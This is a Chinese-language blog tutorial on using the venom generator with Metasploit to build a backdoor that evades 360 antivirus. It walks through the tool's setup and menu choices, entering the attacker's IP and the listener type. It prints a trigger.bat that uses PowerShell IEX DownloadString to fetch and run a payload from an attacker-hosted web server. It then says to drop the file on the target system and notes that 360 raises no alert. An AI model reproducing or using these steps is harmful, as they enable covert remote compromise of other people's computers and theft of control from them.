---
title: 免杀后门venom 和Metasploit 完美绕过360
date: 2017-01-15 14:09:50
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
<h1><span style="color: #ff0000;">下面是我做的演示视频：</span></h1>

 <h1 id="一言不合的请猛击一下下列视频"><a href="#测试视频播放" class="headerlink" ></a></h1><hr>

<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/venom.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>


<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29019227&auto=1&height=66"></iframe>
<h1><span style="color: #ff0000;">背景介绍：</span></h1>
<pre class="lang:vim decode:true">脚本将使用msfvenom（metasploit）来生成shellcode
在不同的格式（c | python | ruby | dll | msi | hta-psh）
将生成的shellcode注入一个模板（例如：python）
“python功能将执行shellcode into ram”并使用
编译器如gcc（gnu交叉编译器）或mingw32或pyinstaller
要构建可执行文件，还要启动多处理程序
恢复远程连接（shell或meterpreter会话）。
</pre>
<pre class="lang:vim decode:true">“venom  generator”工具再现了一些使用的技术
通过Veil-Evasion.py，unicorn.py，powersploit.py等，等等。
但毒液它不是这个工具的任何一个叉子，因为它的writen
使用Bash反对那些使用Python的工具，也
remmenber面纱逃避不建立这种格式：
[.msi .hta .vbs .ps1 .dll .php .jar .pdf]有效内容格式...

</pre>
![enter description here][2]

&nbsp;
<h1><span style="color: #ff0000;">下载安装</span></h1>
下载地址：https://github.com/r00t-3xp10it/venom
<pre class="lang:vim decode:true ">1- Download framework from github
tar.gz OR zip OR git clone</pre>

<pre class="lang:vim decode:true ">2- Set files execution permitions
cd venom-main
sudo chmod -R +x *.sh
sudo chmod -R +x *.py</pre>

<pre class="lang:vim decode:true ">3  - Install dependencies
cd aux
sudo ./setup.sh</pre>

<pre class="lang:vim decode:true ">4 - Run main tool
sudo ./venom.sh  </pre>
![enter description here][3]

&nbsp;
<h1><strong><span style="color: #ff0000;">使用步骤：</span></strong></h1>
上图这里的模块比较多有<strong><span style="color: #ff0000;">apk(安卓)/exe/php/vbs/bat/等</span></strong>
<ol>
 	<li> 我这里就测试<span style="color: #ff0000;">11号</span>模块</li>
</ol>
![enter description here][4]

&nbsp;

2. 填写<strong><span style="color: #ff0000;">攻击者的IP地址以及端口</span></strong>
![enter description here][5]
![enter description here][6]
&nbsp;
&nbsp;

&nbsp;
<h1>     3. <strong><span style="color: #ff0000;">填写后门名称 </span></strong></h1>
![enter description here][7]

&nbsp;
<h1>4. 填写<strong><span style="color: #ff0000;">后门监听模块类型</span></strong></h1>
![enter description here][8]

&nbsp;
<h1></h1>
<h1>4. <strong><span style="color: #ff0000;">查看outoput 输出文件。</span></strong></h1>
![enter description here][9]
<h1>这里选择msf 的后门模块，选择完后自动帮你设置相关参数，----更加自动化，懒人化。</h1>
![enter description here][10]
![enter description here][11]
&nbsp;

&nbsp;
<h1>5.我们这里只需要<strong><span style="color: #ff0000;">trigger.bat</span></strong>文件，到目标系统运行一次即可！</h1>
我们在此之前查看下bat文件编写的内容。 需要我们把xxxx.ps1文件放到 web服务器上。 让powershell 去下载木马
<pre class="lang:vim decode:true">:: powershell template | Author: r00t-3xp10it
:: Matthew Graeber - DownloadString
:: Download/execute payload in RAM
:: ---
@echo off
echo [*] Please wait, preparing software ...
powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.149/demon.ps1')
</pre>
&nbsp;

&nbsp;
<h1>6，我这里开启kali 的apche服务，将xxxx.ps1丢到 <strong><span style="color: #ff0000;">/var/www/</span></strong>目录下  好让木</h1>
<h1>马文件访问攻击者web地址。</h1>
<pre class="lang:vim decode:true ">service apache2 start</pre>
![enter description here][12]

&nbsp;
<h1>7.准备工作完成。</h1>
将<strong><span style="color: #ff0000;">trigger.bat</span></strong>文件丢到目标系统，可以360扫描检查。执行过程等 360无报毒等拦截现象。

&nbsp;

&nbsp;


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0583.JPG 
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0584.JPG 
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0585.JPG 
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0586.JPG 
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0587.JPG 
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0588.JPG 
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0589.JPG 
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0590.JPG 
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0591.PNG 
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0592.JPG 
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0593.JPG 
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0594.JPG 